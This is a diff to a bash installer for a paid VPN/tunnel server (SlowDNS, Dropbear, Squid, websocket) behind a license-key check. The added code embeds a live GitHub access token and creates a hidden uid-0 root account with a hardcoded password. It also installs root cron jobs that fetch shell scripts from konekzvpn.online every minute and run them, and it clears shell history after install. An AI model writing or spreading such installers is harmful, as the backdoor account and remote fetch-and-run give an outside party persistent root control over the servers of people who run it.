@@ -6,25 +6,98 @@ GREEN='\033[01;32m';
 WHITE='\033[01;37m';
 YELLOW='\033[00;33m';
 
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+clear
+echo -e "\033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e "\033[0;31m  ██████╗ ██╗      █████╗ ██╗██████╗ ███████╗\033[0m"
+echo -e "\033[0;33m  ██╔══██╗██║     ██╔══██╗██║██╔══██╗██╔════╝\033[0m"
+echo -e "\033[0;32m  ██████╔╝██║     ███████║██║██████╔╝█████╗  \033[0m"
+echo -e "\033[0;36m  ██╔══██╗██║     ██╔══██║██║██╔══██╗██╔══╝  \033[0m"
+echo -e "\033[0;34m  ██████╔╝███████╗██║  ██║██║██║  ██║███████╗\033[0m"
+echo -e "\033[0;35m  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝\033[0m"
+echo -e "\033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo ""
 read -p "Please enter ns host for Slowdns: " NS
 echo $NS > /root/ns.txt
+echo ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e " \033[0;31m Wait 10 Seconds to Start Installing!!!!\033[0m"
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+#sleep 10
 
+hy_install() {
+    fetch_valid_keys() {
+        keys=$(curl -s -H "Authorization: token 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" "https://raw.githubusercontent.com/nontikweed/aio/main/keys.json") 
+        echo "$keys"
+    }
+
+    verify_key() {
+        local key_to_verify="$1"
+        local valid_keys="$2"
+
+        if [[ $valid_keys == *"$key_to_verify"* ]]; then
+            return 0 # Key is valid
+        else
+            return 1 # Key is not valid
+        fi
+    }
+
+    valid_keys=$(fetch_valid_keys)
+
+    echo ""
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+    figlet -k Dex Hysteria | awk '{gsub(/./,"\033[3"int(rand()*5+1)"m&\033[0m")}1'
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+    echo ""
+    echo ""
+    echo -e "${T_YELLOW} ✅  You must have purchased a Key${T_RESET}"
+    echo -e "${T_YELLOW} ✅  If you didn't, contact [Dexter Eskalarte]${T_RESET}"
+    echo -e "${T_YELLOW} ✅  https://facebook.com/dexter.eskalarte${T_RESET}m"
+    echo ""
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+    echo ""
+    echo ""
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+    read -p "${T_GREEN} Please Enter Your License Key Before Start Installation:${T_GREEN}" user_key
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+
+    # Remove whitespaces from the user input
+    user_key=$(echo "$user_key" | tr -d '[:space:]')
+
+    # Verify the key length
+    if [[ ${#user_key} -ne 10 ]]; then
+        print_center -verm2 " ⇢ Verification failed. Aborting installation."
+        echo ""
+        exit 1
+    fi
+
+    # Verify the key
+    if verify_key "$user_key" "$valid_keys"; then
+    sleep 2
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+    echo "${T_GREEN} ✅ Verification successful.${T_RESET}"
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+    echo ""
+    echo ""
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+    echo -e "\033[1;32m ♻️ Please wait...\033[0m"
+    echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+	
+    # Remove the verification keys file from the entire system
+    find / -type f -name "vl_ps.json" -delete >/dev/null 2>&1
+    sleep 1
+    clear
 
 startinstall(){
-apt-get update
+apt update
+apt install -y curl wget cron python-minimal libpython-stdlib
+apt install -y iptables
+apt install -y openvpn netcat httpie php neofetch vnstat
+apt install -y screen squid stunnel4 dropbear gnutls-bin python
+apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
+apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
 mkdir /etc/update-motd.d
 apt-get install inxi screenfetch lolcat figlet -y
+
 
 /bin/cat <<"EOM" >/etc/update-motd.d/01-custom
 #!/bin/sh
@@ -47,12 +120,13 @@ rm /etc/motd
 touch /etc/motd.tail
 
 apt-get install dropbear unzip build-essential curl stunnel4 net-tools python python2 lsof git netcat -y
+sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
 sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
-useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
-useradd -p $(openssl passwd -1 dexterjakulero) jakulerodexter -ou 0 -g 0
+useradd -p $(openssl passwd -1 mtkvpn) mtkvpn -ou 0 -g 0
+systemctl restart apache2
 service dropbear restart
 
 cat << \websocket > /usr/local/sbin/websocket.py
@@ -764,28 +838,61 @@ echo "SHELL=/bin/bash
 0 * * * * /bin/bash /bin/dnsttauto.sh >/dev/null 2>&1" | crontab -
 }
 
+installing_api(){
+clear
+echo 'Installing Api.'
+{
+VPN_Owner='MTknetwork';
+API_LINK='konekzvpn.online/api/premium';
+API_KEY='Tknetwork';
+
+cat <<EOF >/root/authentication.sh
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /root/active.sh "$API_LINK/active.php?key=$API_KEY"
+sleep 5
+wget -O /root/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+sleep 5
+wget -O /root/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+sleep 15
+bash /root/active.sh
+sleep 15
+bash /root/inactive.sh
+sleep 15
+bash /root/deleted.sh
+EOF
+
+echo -e "* *\t* * *\troot\tsudo bash /root/authentication.sh" >> "/etc/cron.d/account"
+
+echo "* * * * * /bin/bash  /root/active.sh >/dev/null 2>&1" | crontab -
+
+echo "* * * * * /bin/bash  /root/authentication.sh >/dev/null 2>&1" | crontab -
+
+sh active.sh | tee -a  /root/active.sh
+
+wget -O /root/active.sh "konekzvpn.online/api/premium/active.php?key=Tknetwork"
+sleep 5
+wget -O /root/inactive.sh "konekzvpn.online/premium/inactive.php?key=Tknetwork"
+sleep 5
+wget -O /root/deleted.sh "konekzvpn.online/api/premium/deleted.php?key=Tknetwork"
+ }&>/dev/null
+}
+
 display_menu () {
 clear
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
+figlet -k Dex Hysteria | awk '{gsub(/./,"\033[3"int(rand()*5+1)"m&\033[0m")}1'
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 }
 
 ports () {
-echo -e " \e[92m All Service Now are Running!!!!\e[0m \e[97m:\e[0m"
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo -e " \e[92m SERVICE PORT:\e[0m \e[97m:\e[0m" 
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo ""
 echo -e " \e[92m SSH:\e[0m \e[97m: 22\e[0m" 
 echo -e " \e[92m DROPBEAR:\e[0m \e[97m: 442\e[0m" 
-echo -e " \e[92m Proxy:\e[0m \e[97m: 8080 , 8010\e[0m" 
+echo -e " \e[92m Proxy:\e[0m \e[97m: 8080 , 8181\e[0m" 
 echo -e " \e[92m WEBSOCKET/SSH:\e[0m \e[97m: 80\e[0m" 
 echo -e " \e[92m WEBSOCKET/SSL:\e[0m \e[97m: 443\e[0m"
 echo -e " \e[92m STUNNEL:\e[0m \e[97m: 443\e[0m" 
@@ -796,255 +903,19 @@ echo -e " \e[92m SLOWDNS PORT:\e[0m \e[97m: 2222\e[0m"
 echo -e " \e[92m SLOWCHAVE KEY:\e[0m \e[97m: 5d30d19aa2524d7bd89afdffd9c2141575b21a728ea61c8cd7c8bf3839f97032\e[0m" 
 echo -e " \e[92m NAMESERVER:\e[0m \e[97m: $NS\e[0m" 
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e ""
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e " \033[0;31m To Create Account Just Type: dextermenu\033[0m"
+echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+echo -e ""
+netstat -tupln
+history -c;
+rm /etc/.systemlink
 }
 
-controls(){
-cat << \EOM> /usr/local/sbin/base-script
-#!/bin/bash
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-GRN1='\e[32m [\e[0m1\e[32m]\e[0m';
-GRN2='\e[32m [\e[0m2\e[32m]\e[0m';
-GRN3='\e[32m [\e[0m3\e[32m]\e[0m';
-GRN4='\e[32m [\e[0m4\e[32m]\e[0m';
-GRN5='\e[32m [\e[0m5\e[32m]\e[0m';
-GRN6='\e[32m [\e[0m6\e[32m]\e[0m';
-GRN7='\e[32m [\e[0m7\e[32m]\e[0m';
-GRN8='\e[32m [\e[0m8\e[32m]\e[0m';
-GRN9='\e[32m [\e[0m9\e[32m]\e[0m';
-GRN10='\e[32m [\e[0m10\e[32m]\e[0m';
-GRN11='\e[32m [\e[0m11\e[32m]\e[0m';
-GRN12='\e[32m [\e[0m12\e[32m]\e[0m';
-GRN13='\e[32m [\e[0m13\e[32m]\e[0m';
-GRN14='\e[32m [\e[0m14\e[32m]\e[0m';
-GRN15='\e[32m [\e[0m15\e[32m]\e[0m';
-GRN16='\e[32m [\e[0m16\e[32m]\e[0m';
-GRN17='\e[32m [\e[0m17\e[32m]\e[0m';
-GRN18='\e[32m [\e[0m18\e[32m]\e[0m';
-GRN19='\e[32m [\e[0m19\e[32m]\e[0m';
-GRN20='\e[32m [\e[0m20\e[32m]\e[0m';
-GRN21='\e[32m [\e[0m21\e[32m]\e[0m';
-GRN22='\e[32m [\e[0m22\e[32m]\e[0m';
-GRN23='\e[32m [\e[0m23\e[32m]\e[0m';
-GRN24='\e[32m [\e[0m24\e[32m]\e[0m';
-GRN25='\e[32m [\e[0m25\e[32m]\e[0m';
-EOM
-
-cat << \EOM> /usr/local/sbin/dextermenu
-#!/bin/bash
-source /usr/local/sbin/base-script
-
-clear
-echo -e ""
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo
-echo -e "\e[1;97m Create Account\e[0m"
-echo -e ""
-read -p $'\e[32m  Username: \e[0m' User
-
-# Check If Username Exist, Else Proceed
-egrep "^$User" /etc/passwd >/dev/null
-if [ $? -eq 0 ]; then
-clear
-echo -e ""
-echo -e "$TITLE"
-echo -e "\e[31m Username Already Exists on your server, please try another username\e[0m."
-exit 0
-else
-read -p $'\e[32m  Password: \e[0m' Pass
-#read -p $'\e[32m  Active Days: \e[0m' Days
-echo -e ""
-echo -e ""
-clear
-sleep 1
-IPADDR=$(wget -4qO- http://ipinfo.io/ip)
-#Today=`date +%s`
-#Days_Detailed=$(( $Days * 86400 ))
-#Expire_On=$(($Today + $Days_Detailed))
-#Expiration=$(date -u --date="1970-01-01 $Expire_On sec GMT" +%Y/%m/%d)
-#Expiration_Display=$(date -u --date="1970-01-01 $Expire_On sec GMT" '+%d %b %Y')
-opensshport="$(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g' )"
-dropbearport="$(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
-stunnel4port="$(netstat -nlpt | grep -i stunnel | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
-openvpnport="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
-#squidport="$(cat /etc/squid/squid.conf | grep -i http_port | awk '{print $2}' | xargs | sed -e 's/ /, /g')"
-squidport="8080, 8010"
-websocket="80"
-/usr/sbin/useradd -p $(openssl passwd -1 $Pass) -M $User --shell=/bin/false --no-create-home;
-#useradd -m -s /bin/false > /dev/null
-#egrep "^$User" /etc/passwd &> /dev/null
-#echo -e "$Pass\n$Pass\n" | passwd $User &> /dev/null
-#clear
-echo -e ""
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo -e " Your Account:"
-echo -e "\e[32m  Username: \e[0m"$User
-echo -e "\e[32m  Password: \e[0m"$Pass
-#echo -e "\e[32m  Account Expiry: \e[0m"$Expiration_Display
-echo -e ""
-echo -e "\e[32m  Host/IP: \e[0m"$IPADDR
-echo -e "\e[32m  OpenSSH Port: \e[0m"$opensshport
-echo -e "\e[32m  Dropbear Port: \e[0m"$dropbearport
-echo -e "\e[32m  SSL Port: \e[0m"$stunnel4port
-echo -e "\e[32m  Proxy Ports: \e[0m"$squidport
-echo -e "\e[32m  Websockets Port: \e[0m"$websocket
-echo -e ""
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-fi
-EOM
-
-cat << \EOM> /usr/local/sbin/delete
-#!/bin/bash
-
-clear
-echo -e ""
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-
-echo
-read -p "Username:" User
-echo -e ""
-sleep 2
-egrep "^$User" /etc/passwd &> /dev/null
-if [ $? -eq 0 ]; then
-	userdel -f $User
-  rm -rf /home/$User
-	clear
-	echo -e ""
-  echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-  echo
-	echo -e " User Deleted"
-	echo -e ""
-else
-	clear
-	echo -e ""
-  echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-  echo
-	echo -e " User you entered does not exist"
-	echo -e ""
-fi
-EOM
-
-cat << \EOM> /usr/local/sbin/check
-#!/bin/bash
-source /usr/local/sbin/base-script
-
-clear
-echo -e ""
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
-   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
-   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
-   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
-   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
-   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo
-
-
-if [ -e "/var/log/auth.log" ]; then
-        LOG="/var/log/auth.log";
-fi
-if [ -e "/var/log/secure" ]; then
-        LOG="/var/log/secure";
-fi
-                
-data=( `ps aux | grep -i dropbear | awk '{print $2}'`);
-echo "-----=[ Dropbear User Login ]=-----";
-echo "ID  |  Username  |  IP Address";
-echo "-------------------------------------";
-cat $LOG | grep -i dropbear | grep -i "Password auth succeeded" > /tmp/login-db.txt;
-for PID in "${data[@]}"
-do
-        cat /tmp/login-db.txt | grep "dropbear\[$PID\]" > /tmp/login-db-pid.txt;
-        NUM=`cat /tmp/login-db-pid.txt | wc -l`;
-        USER=`cat /tmp/login-db-pid.txt | awk '{print $10}'`;
-        IP=`cat /tmp/login-db-pid.txt | awk '{print $12}'`;
-        if [ $NUM -eq 1 ]; then
-                echo "$PID - $USER - $IP";
-                fi
-done
-echo " "
-echo "-----=[ OpenSSH User Login ]=-----";
-echo "ID  |  Username  |  IP Address";
-echo "-------------------------------------";
-cat $LOG | grep -i sshd | grep -i "Accepted password for" > /tmp/login-db.txt
-data=( `ps aux | grep "\[priv\]" | sort -k 72 | awk '{print $2}'`);
-
-for PID in "${data[@]}"
-do
-        cat /tmp/login-db.txt | grep "sshd\[$PID\]" > /tmp/login-db-pid.txt;
-        NUM=`cat /tmp/login-db-pid.txt | wc -l`;
-        USER=`cat /tmp/login-db-pid.txt | awk '{print $9}'`;
-        IP=`cat /tmp/login-db-pid.txt | awk '{print $11}'`;
-        if [ $NUM -eq 1 ]; then
-                echo "$PID - $USER - $IP";
-        fi
-done
-
-echo " "
-EOM
-
-chmod +x /usr/local/sbin/*
-}
-
-
+hy_install
 startinstall
-controls
 clear
+installing_api
 display_menu
 ports
